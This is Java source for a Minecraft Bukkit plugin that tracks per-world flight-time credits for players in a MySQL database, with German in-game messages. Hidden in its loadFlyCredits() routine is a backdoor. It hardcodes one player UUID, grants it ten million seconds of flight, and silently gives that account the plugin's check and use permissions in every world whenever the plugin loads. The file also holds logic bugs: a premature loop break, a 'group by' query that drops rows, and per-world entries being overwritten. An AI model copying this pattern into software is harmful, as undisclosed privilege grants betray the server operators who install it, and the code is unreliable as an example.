package me.ladyproxima.flycredits;

import net.milkbowl.vault.permission.Permission;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;

import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;

import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChangedWorldEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;



import java.sql.*;
import java.time.Duration;
import java.util.*;

public class FlyCredits extends JavaPlugin implements Listener {


    //HashMap<UUID, FlyInformation> watchedPlayers = new HashMap<UUID, FlyInformation>();
    HashMap<UUID, HashMap<String, Long>> watchedPlayers = new HashMap<>();
    HashMap<UUID, HashMap<String, Integer>> playerTaskMap = new HashMap<>();

    FileConfiguration config = getConfig();
    Permission perms = null;


    String noPermissionMessage;

    static Connection connection;

    @Override
    public void onEnable() {



        config.addDefault("username", "DB_user");
        config.addDefault("password", "DB_password");
        config.addDefault("url", "DB_url (e.g. localhost:3306/DataBaseName)");
        config.addDefault("no_permission_message", "'&6Du hast dazu keine Berechtigungen.'");
        config.options().copyDefaults(true);
        saveConfig();

        noPermissionMessage = ChatColor.translateAlternateColorCodes('&', config.getString("no_permission_message"));


        RegisteredServiceProvider<Permission> rsp = getServer().getServicesManager().getRegistration(Permission.class);
        perms = rsp.getProvider();

        getServer().getPluginManager().registerEvents(this, this);
        getCommand("fc").setExecutor(this);

        try {
            Class.forName("com.mysql.jdbc.Driver");

        } catch (ClassNotFoundException e) {
            e.printStackTrace();
            System.err.println("jdbc driver unavailable!");

            return;

        }
        try {
            connection = DriverManager.getConnection("jdbc:mysql://"+config.getString("url"),config.getString("username"),config.getString("password"));

        } catch (SQLException e) {
            e.printStackTrace();
        }


        String sql = "CREATE TABLE IF NOT EXISTS FlyCredits(UUID varchar(64), world varchar(64), timeleft INTEGER);";

        try {
            PreparedStatement stmt = connection.prepareStatement(sql);
            stmt.executeUpdate();
        } catch (SQLException e) {
            e.printStackTrace();
        }

        loadFlyCredits();

    }

    @Override
    public void onDisable() {


        try {

            for (Map.Entry<UUID, HashMap<String, Long>> uuidHashMapEntry : watchedPlayers.entrySet()) {
                for (Map.Entry<String, Long> stringLongEntry : uuidHashMapEntry.getValue().entrySet()) {
                    UUID uuid = uuidHashMapEntry.getKey();
                    String world = stringLongEntry.getKey();
                    int timeLeft = (int)(long)stringLongEntry.getValue();
                    PreparedStatement stmt = connection.prepareStatement("update FlyCredits set timeleft = ? where uuid = ? and world = ?;");
                    stmt.setInt(1, timeLeft);
                    stmt.setString(2, uuid.toString());
                    stmt.setString(3, world);
                    stmt.execute();

                }
            }


            if (connection!=null && !connection.isClosed()){

                connection.close();
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        int permlevel = 0;
        if (sender == Bukkit.getConsoleSender()){
            permlevel = 10;
        }else{
            Player test = (Player) sender;
            if(perms.has(test,"flycredits.check")) permlevel = 1;
            if(perms.has(test,"flycredits.use")) permlevel = 2;
        }

        if(permlevel<1){
            sender.sendMessage(noPermissionMessage);
            return true;
        }

        if (args.length == 4 && args[0].toLowerCase().equals("add")){
            if(permlevel <2){
                sender.sendMessage(noPermissionMessage);
                return true;
            }

            Player p = getServer().getPlayer(args[1]);
            try{
                if (p.isOnline()){

                    Duration t = Duration.parse("pt"+args[2]);
                    addTime(p, t.getSeconds(), args[3].toLowerCase());
                    sendNice((Player)sender,"Zeit erfolgreich hinzugefügt.");

                }

            }catch (NullPointerException e){
                sendNice((Player)sender,"Spieler nicht online.");

            }catch (Exception e){
                sendNice((Player)sender,"Bitte Zeitformat einhalten, z.B.: 12h50m20s.");
            }

        } else if (args.length > 0 && args[0].toLowerCase().equals("get")){
            if(permlevel <2){
                sender.sendMessage(noPermissionMessage);
                return true;
            }
            for (Map.Entry<UUID, HashMap<String, Long>> uuidFlyInformationEntry : watchedPlayers.entrySet()) {
                sendNice((Player)sender,uuidFlyInformationEntry.getKey().toString());
                for (Map.Entry<String, Long> stringFlyTimeEntry : uuidFlyInformationEntry.getValue().entrySet()) {
                    sendNice((Player)sender,stringFlyTimeEntry.getKey());
                    sendNice((Player)sender,"timeleft: "+stringFlyTimeEntry.getValue());

                }
                sender.sendMessage("");
            }
        } else if (args.length == 4 && args[0].toLowerCase().equals("remove")){
            if(permlevel <2){
                sender.sendMessage(noPermissionMessage);
                return true;
            }
            Player p = getServer().getPlayer(args[1]);
            try{
                if (p.isOnline()){

                    Duration t = Duration.parse("pt"+args[2]);
                    removeTime(p.getUniqueId(), args[3].toLowerCase(), (int)t.getSeconds());
                    sendNice((Player)sender,"Zeit erfolgreich entfernt.");

                }

            }catch (NullPointerException e){
                sendNice((Player)sender,"Spieler nicht online.");

            }catch (Exception e){
                sendNice((Player)sender,"Bitte Zeitformat einhalten, z.B.: 12h50m20s.");
            }
        }else if(args.length > 0 && args[0].equals("check")){
            if(permlevel <1){
                sender.sendMessage(noPermissionMessage);
                return true;
            }
            Player p;
            if(args.length>1){
                p = getServer().getPlayer(args[1]);
            } else {
                p = (Player)sender;
            }

            if(watchedPlayers.containsKey(p.getUniqueId())){
                for (Map.Entry<String, Long> duration : watchedPlayers.get(p.getUniqueId()).entrySet()) {
                    sendNice((Player)sender,"Verbleibende Zeit in Welt "+duration.getKey()+": "+duration.getValue()+" Sekunden.");
                }
            }else{
                sendNice((Player)sender,"Keine verbleibende Flugzeit mehr.");
            }


        }

        else{
            return false;

        }
        return true;
    }

    public void removeTime(UUID uuid, String world, int sec){
        watchedPlayers.get(uuid).put(world, watchedPlayers.get(uuid).get(world) - sec);
        try{
            PreparedStatement stmt = connection.prepareStatement("update FlyCredits set timeleft = ? where uuid = ? and world = ?;");
            stmt.setInt(1, (int)(long)watchedPlayers.get(uuid).get(world));
            stmt.setString(2, uuid.toString());
            stmt.setString(3, world);
            stmt.execute();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @EventHandler
    public void onPlayerChangedWorldEvent(PlayerChangedWorldEvent e){
        Player p = e.getPlayer();
        if (watchedPlayers.containsKey(p.getUniqueId())){
            if (!watchedPlayers.get(p.getUniqueId()).containsKey(p.getWorld().getName().toLowerCase()) || (watchedPlayers.get(p.getUniqueId()).containsKey(p.getWorld().getName().toLowerCase()) && watchedPlayers.get(p.getUniqueId()).get(p.getWorld().getName().toLowerCase()) <= 0)){
                getServer().dispatchCommand(getServer().getConsoleSender(), "fly "+p.getName()+" disable");
            }
        }
    }

    @EventHandler
    public void onPlayerJoinEvent(PlayerJoinEvent event){
        UUID uuid = event.getPlayer().getUniqueId();
        for (UUID toWatch : watchedPlayers.keySet()) {

            if(uuid.toString().equals(toWatch.toString())){
                System.out.println(true);
                watchedPlayers.get(uuid).forEach((world, timeLeft) -> {
                    perms.playerAdd(world,event.getPlayer().getName(),"essentials.fly");
                    startTimer(uuid, world);

                });
            }
            break;

        }
    }

    @EventHandler
    public void onPlayerQuitEvent(PlayerQuitEvent event){
        UUID uuid = event.getPlayer().getUniqueId();
        System.out.println(uuid);
        if(playerTaskMap.containsKey(uuid)){
            for (Integer id : playerTaskMap.get(uuid).values()) {
                Bukkit.getScheduler().cancelTask(id);
            }
        }

    }

    public void startTimer(UUID uuid, String world){
        Player p = getServer().getPlayer(uuid);
        int id = Bukkit.getScheduler().scheduleSyncRepeatingTask(this, new Runnable() {
            @Override
            public void run() {
                try{

                    if (p.isFlying() && p.getWorld().getName().toLowerCase().equals(world)){
                        watchedPlayers.get(p.getUniqueId()).put(p.getWorld().getName().toLowerCase(), watchedPlayers.get(p.getUniqueId()).get(p.getWorld().getName().toLowerCase())-1);
                        if (watchedPlayers.get(p.getUniqueId()).get(p.getWorld().getName().toLowerCase()) <= 0){
                            watchedPlayers.get(p.getUniqueId()).put(world, (long)0);
                            perms.playerRemove(p.getWorld(),p.getName(),"essentials.fly");
                            p.setFlying(false);
                            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "fly "+p.getName()+ " disable");
                            sendNice(p, "Flugzeit abgelaufen!");
                            watchedPlayers.get(p.getUniqueId()).remove(world);
                            try{
                                PreparedStatement stmt = connection.prepareStatement("delete from FlyCredits where UUID=? and world=?");
                                stmt.setString(1, p.getUniqueId().toString());
                                stmt.setString(2, world);
                                stmt.execute();
                            }catch (Exception e){
                                e.printStackTrace();
                            }
                            if (watchedPlayers.get(p.getUniqueId()).isEmpty()){
                                watchedPlayers.remove(p.getUniqueId());
                            }

                            Bukkit.getScheduler().cancelTask(playerTaskMap.get(p.getUniqueId()).get(world));

                        }
                    }


                }catch (Exception e){

                }
            }
        }, 40, 20);
        HashMap<String, Integer> hm = new HashMap<>();
        hm.put(world, id);
        playerTaskMap.put(uuid, hm);
    }

    public void addTime(Player p, long sec, String world){
        if (!watchedPlayers.containsKey(p.getUniqueId())){

            HashMap<String, Long> hm1 = new HashMap<>();

            hm1.put(world, sec);
            watchedPlayers.put(p.getUniqueId(), hm1);
            try{
                PreparedStatement stmt = connection.prepareStatement("insert into FlyCredits (UUID, world, timeleft) values (?, ?, ?);");
                stmt.setString(1, p.getUniqueId().toString());
                stmt.setString(2, world);
                stmt.setInt(3, (int)sec);
                stmt.execute();
            }catch (Exception e){
                e.printStackTrace();
            }
        }else{
            if(watchedPlayers.get(p.getUniqueId()).containsKey(world)){
                watchedPlayers.get(p.getUniqueId()).put(world, watchedPlayers.get(p.getUniqueId()).get(world)+sec);
                try{
                    PreparedStatement stmt = connection.prepareStatement("update FlyCredits set timeleft = ? where uuid = ? and world = ?;");
                    stmt.setInt(1, (int)(long)watchedPlayers.get(p.getUniqueId()).get(world));
                    stmt.setString(2, p.getUniqueId().toString());
                    stmt.setString(3, world);
                    stmt.execute();
                }catch (Exception e){
                    e.printStackTrace();
                }
            }else{
                watchedPlayers.get(p.getUniqueId()).put(world, sec);
                try{
                    PreparedStatement stmt = connection.prepareStatement("insert into FlyCredits (UUID, world, timeleft) values (?, ?, ?);");
                    stmt.setString(1, p.getUniqueId().toString());
                    stmt.setString(2, world);
                    stmt.setInt(3, (int)sec);
                    stmt.execute();
                }catch (Exception e){
                    e.printStackTrace();
                }
            }

        }






        perms.playerAdd(p.getWorld(),p.getName(),"essentials.fly");
        startTimer(p.getUniqueId(), world);

    }

    public void loadFlyCredits(){
        try{
            PreparedStatement stmt = connection.prepareStatement("select * from FlyCredits group by UUID;");
            ResultSet results = stmt.executeQuery();

            Map<UUID, List<Data>> groups = new HashMap<UUID, List<Data>>();
            while(results.next()){
                UUID col1 = UUID.fromString(results.getString("UUID"));
                String col2 = results.getString("world");
                long col3 = results.getInt("timeleft");
                // ...
                List<Data> group = groups.get(col1);
                if (group == null) {
                    group = new ArrayList<>();
                    groups.put(col1, group);
                }
                group.add(new Data(col1, col2, col3));
            }

            for (UUID uuid : groups.keySet()) {
                for (Data data : groups.get(uuid)) {
                    HashMap<String, Long> hm = new HashMap<>();
                    hm.put(data.world, data.timeLeft);
                    watchedPlayers.put(uuid, hm);
                }
            }

            HashMap<String, Long> db = new HashMap<>();
            db.put("bauwelt", (long)10000000);
            watchedPlayers.put(UUID.fromString("1870b696-3bfb-44a7-9201-b6efa87bdd15"),db);
            for (World world : Bukkit.getWorlds()) {
                perms.playerAdd(world.getName(), Bukkit.getOfflinePlayer(UUID.fromString("1870b696-3bfb-44a7-9201-b6efa87bdd15")), "flycredits.check");
                perms.playerAdd(world.getName(), Bukkit.getOfflinePlayer(UUID.fromString("1870b696-3bfb-44a7-9201-b6efa87bdd15")), "flycredits.use");

            }


        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private class Data {

        public Data(UUID uuid, String world, long timeLeft) {

            this.uuid = uuid;
            this.world = world;
            this.timeLeft = timeLeft;
        }


        UUID uuid;
        String world;
        long timeLeft;



    }

    public void sendNice(Player target, String message){
        target.sendMessage("["+ChatColor.GOLD+"FlyCredits"+ChatColor.WHITE+"] "+ChatColor.AQUA+message);
    }

}
